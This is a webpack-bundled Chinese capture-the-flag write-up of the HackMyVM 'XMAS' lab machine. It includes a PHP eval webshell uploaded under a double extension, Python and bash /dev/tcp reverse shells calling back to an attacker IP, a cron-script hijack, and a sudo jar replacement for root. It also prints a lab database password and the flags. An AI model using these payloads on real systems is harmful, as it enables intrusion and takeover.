"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[267],{1573:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>l,toc:()=>c});var t=a(5893),s=a(1151);const r={},i="XMAS",l={id:"HackMyVM/Machines/XMAS/index",title:"XMAS",description:"[Linux VM] [Tested on VirtualBox] created by || eMVee",source:"@site/docs/HackMyVM/Machines/XMAS/index.md",sourceDirName:"HackMyVM/Machines/XMAS",slug:"/HackMyVM/Machines/XMAS/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/XMAS/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/XMAS/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Whitedoor",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Whitedoor/"},next:{title:"Zeug",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Zeug/"}},o={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"\u626b\u63cf\u63d0\u6743\u8def\u5f84",id:"\u626b\u63cf\u63d0\u6743\u8def\u5f84",level:3},{value:"User - alabaster",id:"user---alabaster",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag- root",id:"flag--root",level:3}];function _(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"xmas",children:"XMAS"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || eMVee"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2023-12-25"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 9cd7c659698762402ddd74c8da7cc534"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 40"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 40"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nMerry Christmas to everyone!"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.101\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.101\nHost is up (0.00063s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)\n|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)\n80/tcp open  http    Apache httpd 2.4.55\n|_http-title: Did not follow redirect to http://christmas.hmv\n|_http-server-header: Apache/2.4.55 (Ubuntu)\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6dfb\u52a0 hosts \u8bb0\u5f55"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/hosts"',children:"192.168.56.101 christmas.hmv\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"access /",src:a(1185).Z+"",width:"2560",height:"1556"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"[10:28:15] 200 -    6KB - /images/\n[10:28:16] 200 -   22KB - /index.php\n[10:28:16] 200 -   22KB - /index.php/login/\n[10:28:18] 200 -    4KB - /js/\n[10:28:30] 200 -  949B  - /php/\n[10:28:49] 200 -  744B  - /uploads/\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u7f51\u9875\u4e0b\u534a\u90e8\u5206\u53d1\u73b0\u4e00\u4e2a\u4e0a\u4f20\u529f\u80fd\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u7c7b\u4f3c\u7684\u6587\u4ef6\u540d\u5b9e\u73b0 webshell \u4e0a\u4f20"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",metastring:'title="reverse.pdf.php"',children:"<?php @eval($_POST['shell']) ?>\n// http://christmas.hmv/uploads/reverse.pdf.php\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u5efa\u7acb\u8fde\u63a5"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u8681\u5251 \u5efa\u7acb\u8fde\u63a5",src:a(153).Z+"",width:"1564",height:"1096"})}),"\n",(0,t.jsx)(n.p,{children:"\u76f4\u63a5\u53cd\u5f39 shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'# python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 8888\n[12:09:10] Welcome to pwncat \ud83d\udc08!\\\n[12:10:17] received connection from 192.168.56.101:57480\n[12:10:18] 192.168.56.101:57480: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@xmas:/var/www/christmas.hmv/uploads$ whoami\nwww-data\n'})}),"\n",(0,t.jsx)(n.h3,{id:"\u626b\u63cf\u63d0\u6743\u8def\u5f84",children:"\u626b\u63cf\u63d0\u6743\u8def\u5f84"}),"\n",(0,t.jsx)(n.p,{children:"\u5bf9\u5e38\u89c1\u8def\u5f84\u8fdb\u884c\u63a2\u6d4b\uff0c\u53d1\u73b0"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"(remote) www-data@xmas:/opt/NiceOrNaughty$ pwd\n/opt/NiceOrNaughty\n(remote) www-data@xmas:/opt/NiceOrNaughty$ ls -lh\ntotal 4.0K\n-rwxrwxrw- 1 root root 2.0K Nov 20 18:39 nice_or_naughty.py\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",metastring:'title="/opt/NiceOrNaughty/nice_or_naughty.py"',children:'import mysql.connector\nimport random\nimport os\n\n# Check the wish lists directory\ndirectory = "/var/www/christmas.hmv/uploads"\n# Connect to the mysql database christmas\nmydb = mysql.connector.connect(\n    host="localhost",\n    user="root",\n    password="ChristmasMustGoOn!",\n    database="christmas"\n)\n\n#Read the names of the wish list\ndef read_names(directory):\n    for filename in os.listdir(directory):\n        full_path = os.path.join(directory, filename)\n        if os.path.isfile(full_path):\n            name, ext = os.path.splitext(filename)\n            if any(char.isalnum() for char in name):\n                status = random.choice(["nice", "naughty"])\n                #print(f"{name} {status}")\n                insert_data(name, status)\n                os.remove(full_path)\n            else:\n                pass\n\n        elif os.path.isdir(full_path):\n            pass\n\n# Insert name into the database\ndef insert_data(name, status):\n    mycursor = mydb.cursor()\n    sql = "INSERT INTO christmas (name, status) VALUES ( %s, %s)"\n    val = (name, status)\n    mycursor.execute(sql, val)\n    mydb.commit()\n\n#Generate printable Nice and Naughty list\ndef generate_lists():\n    mycursor = mydb.cursor()\n\n    # SQL query to fetch all names and status\n    mycursor.execute("SELECT name, status FROM christmas")\n\n    # Separate the nice and naughty lists\n    nice_list = []\n    naughty_list = []\n\n    for (name, status) in mycursor:\n        if status == "nice":\n            nice_list.append(name)\n        else:\n            naughty_list.append(name)\n\n    parent_directory = os.path.dirname(os.getcwd())\n    file_path = "/home/alabaster/nice_list.txt"\n    # Save the nice and naughty lists to separate txt files\n    with open(file_path, "w") as file:\n        for name in nice_list:\n            file.write(f"{name}\\n")\n    file_path = "/home/alabaster/naughty_list.txt"\n    with open(file_path, "w") as file:\n        for name in naughty_list:\n            file.write(f"{name}\\n")\n\nread_names(directory)\ngenerate_lists()\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u662f\u5c06\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u89e3\u6790\uff0c\u89e3\u6790\u7ed3\u679c\u50a8\u5b58\u5230\u6570\u636e\u5e93\uff0c\u7136\u540e\u5220\u9664\u3002\u6839\u636e\u4e0a\u4f20\u7684 webshell \u6587\u4ef6\u603b\u662f\u88ab\u5b9a\u65f6\u5220\u9664\uff0c\u53ef\u4ee5\u731c\u6d4b\u8fd9\u662f\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\uff0c\u5e76\u4e14\u76ee\u6807\u6587\u4ef6\u53ef\u63a7\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("192.168.56.102",9999))\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn("bash")\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'(remote) www-data@xmas:/opt/NiceOrNaughty$ echo \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);import pty; pty.spawn("bash")\' > nice_or_naughty.py\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 7777\n[22:51:50] Welcome to pwncat \ud83d\udc08!                                                                                                                                                                 __main__.py:164\n[22:52:01] received connection from 192.168.56.101:36574                                                                                                                                              bind.py:84\n[22:52:02] 192.168.56.101:36574: registered new host w/ db                                                                                                                                        manager.py:957\n(local) pwncat$ back\n(remote) alabaster@xmas:/home/alabaster$ whoami\nalabaster\n'})}),"\n",(0,t.jsx)(n.h2,{id:"user---alabaster",children:"User - alabaster"}),"\n",(0,t.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"(remote) alabaster@xmas:/home/alabaster$ cat user.txt\n    ||::|:||   .--------,\n    |:||:|:|   |_______ /        .-.\n    ||::|:|| .\"`  ___  `\".    {\\('v')/}\n    \\\\\\/\\///:  .'`   `'.  ;____`( )'___________________________\n     \\====/ './  o   o  \\|~     ^\" \"^                          //\n      \\\\//   |   ())) .  |   Merry Christmas!                   \\\n       ||     \\ `.__.'  /|                                     //\n       ||   _{``-.___.-'\\|   Flag: HMV{7bMJ6js7guhQadYDTmBt}    \\\n       || _.\"`-.____.-'`|    ___                              //\n       ||`        __ \\   |___/   \\______________________________\\\n     .\"||        (__) \\    \\|     /\n    /   `\\/       __   vvvvv'\\___/\n    |     |      (__)        |\n     \\___/\\                 /\n       ||  |     .___.     |\n       ||  |       |       |\n       ||.-'|'-.\n       ||          |          )\n       ||----------'---------'\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for alabaster on xmas:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser alabaster may run the following commands on xmas:\n    (ALL : ALL) ALL\n    (ALL) NOPASSWD: /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c06 jar \u6587\u4ef6\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u53cd\u7f16\u8bd1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'package defpackage;\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\n/* renamed from: PublishList  reason: default package */\n/* loaded from: PublishList.jar:PublishList.class */\npublic class PublishList {\n    public static void main(String[] strArr) {\n        try {\n            copyFile("/home/alabaster/nice_list.txt", "/home/santa/");\n            copyFile("/home/alabaster/naughty_list.txt", "/home/santa/");\n            System.out.println("Files copied successfully!");\n        } catch (IOException e) {\n            System.out.println("Failed to copy files!");\n            e.printStackTrace();\n        }\n    }\n\n    private static void copyFile(String str, String str2) throws IOException {\n        FileInputStream fileInputStream = new FileInputStream(str);\n        FileOutputStream fileOutputStream = new FileOutputStream(str2 + new File(str).getName());\n        byte[] bArr = new byte[4096];\n        while (true) {\n            int read = fileInputStream.read(bArr);\n            if (read != -1) {\n                fileOutputStream.write(bArr, 0, read);\n            } else {\n                fileInputStream.close();\n                fileOutputStream.close();\n                return;\n            }\n        }\n    }\n}\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u770b\u8d77\u6765\u6ca1\u6709\u4ec0\u4e48\u7a81\u7834\u53e3\uff0c\u5c31\u662f\u7b80\u5355\u7684\u6587\u4ef6\u590d\u5236\u529f\u80fd\uff0c\u4f46\u662f ",(0,t.jsx)(n.code,{children:"/home/alabaster/PublishList/PublishList.jar"})," \u8fd9\u4e2a\u6587\u4ef6\u662f\u53ef\u63a7\u7684\uff0c\u4e8e\u662f\u53ef\u4ee5\u8003\u8651\u5c06\u5176\u6362\u6210\u6211\u4eec\u7684\u6076\u610f\u8f7d\u8377"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",metastring:'title="shell.java"',children:'public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/192.168.56.102/6666 0>&1")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="Manifest.txt"',children:"Main-Class: shell\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u7f16\u8bd1\u540e\u8fdb\u884c\u90e8\u7f72"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shel",children:'(remote) alabaster@xmas:/tmp$ echo "" > shell.java ;nano shell.java\n(remote) alabaster@xmas:/tmp$ nano Manifest.txt\n(remote) alabaster@xmas:/tmp$ jar cfm Shell.jar Manifest.txt shell.class\n(remote) alabaster@xmas:/tmp$ java -jar Shell.jar \n(remote) alabaster@xmas:/tmp$ cp Shell.jar /home/alabaster/PublishList/PublishList.jar\n(remote) alabaster@xmas:/tmp$ sudo -u root /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde\u7684shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 6666\n[18:05:08] Welcome to pwncat \ud83d\udc08!\n[18:11:17] received connection from 192.168.56.101:40662\n[18:11:18] 192.168.56.101:40662: registered new host w/ db\n(local) pwncat$ back\n\n(remote) root@xmas:/tmp# whomami\nCommand 'whomami' not found, did you mean:\n  command 'whoami' from deb coreutils (9.1-1ubuntu2)\nTry: apt install <deb name>\n(remote) root@xmas:/tmp# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsx)(n.h3,{id:"flag--root",children:"flag- root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) root@xmas:/root# cat root.txt \n      __,_,_,___)          _______\n    (--| | |             (--/    ),_)        ,_) \n       | | |  _ ,_,_        |     |_ ,_ ' , _|_,_,_, _  ,\n     __| | | (/_| | (_|     |     | ||  |/_)_| | | |(_|/_)___,\n    (      |___,   ,__|     \\____)  |__,           |__,\n\n                            |                         _...._\n                         \\  _  /                    .::o:::::.\n                          (\\o/)                    .:::'''':o:.\n                      ---  / \\  ---                :o:_    _:::\n                           >*<                     `:}_>()<_{:'\n                          >0<@<                 @    `'//\\\\'`    @ \n                         >>>@<<*              @ #     //  \\\\     # @\n                        >@>*<0<<<           __#_#____/'____'\\____#_#__\n                       >*>>@<<<@<<         [__________________________]\n                      >@>>0<<<*<<@<         |=_- .-/\\ /\\ /\\ /\\--. =_-|\n                     >*>>0<<@<<<@<<<        |-_= | \\ \\\\ \\\\ \\\\ \\ |-_=-|\n                    >@>>*<<@<>*<<0<*<       |_=-=| / // // // / |_=-_|\n      \\*/          >0>>*<<@<>0><<*<@<<      |=_- |`-'`-'`-'`-'  |=_=-|\n  ___\\\\U//___     >*>>@><0<<*>>@><*<0<<     | =_-| o          o |_==_| \n  |\\\\ | | \\\\|    >@>>0<*<<0>>@<<0<<<*<@<    |=_- | !     (    ! |=-_=|\n  | \\\\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<  _|-,-=| !    ).    ! |-_-=|_\n  |\\ \\| || / //||.*.*.*.|>>@<<*<<@>><0<<@</=-((=_| ! __(:')__ ! |=_==_-\\\n  |\\\\_|_|&&_// ||*.*.*.*|_\\\\db//__     (\\_/)-=))-|/^\\=^=^^=^=/^\\| _=-_-_\\\n  \"\"\"\"|'.'.'.|~~|.*.*.*|     ____|_   =('.')=//   ,------------.      \n      |'.'.'.|   ^^^^^^|____|>>>>>>|  ( ~~~ )/   (((((((())))))))   \n      ~~~~~~~~         '\"\"\"\"`------'  `w---w`     `------------'\n      Flag HMV{GUbM4sBXzvwf7eC9bNL4}\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(_,{...e})}):_(e)}},153:(e,n,a)=>{a.d(n,{Z:()=>t});const t=a.p+"assets/images/image_20240205-120532-978656d3f700b92621abaf1f8dc0e59d.png"},1185:(e,n,a)=>{a.d(n,{Z:()=>t});const t=a.p+"assets/images/image_20240226-102653-34b7a4f27a40c17c321a9252f46cfd8c.png"},1151:(e,n,a)=>{a.d(n,{Z:()=>l,a:()=>i});var t=a(7294);const s={},r=t.createContext(s);function i(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);